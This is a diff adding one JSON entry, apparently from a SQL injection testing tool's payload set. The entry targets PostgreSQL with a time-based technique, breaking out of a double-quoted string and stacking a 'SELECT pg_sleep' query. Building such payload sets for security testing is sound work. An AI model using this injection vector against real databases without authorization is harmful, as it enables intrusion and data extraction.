@@ -1,0 +1,12 @@
+{
+ "dbms": "pgsql",
+ "technique": "time",
+ "boundary": {
+  "prefix": "\"",
+  "suffix": "",
+  "type": "double-quote",
+  "desc": "double-quoted string"
+ },
+ "vector": "{B}; SELECT pg_sleep({SLEEP})-- -",
+ "comment": "pgsql time via double-quoted string"
+}
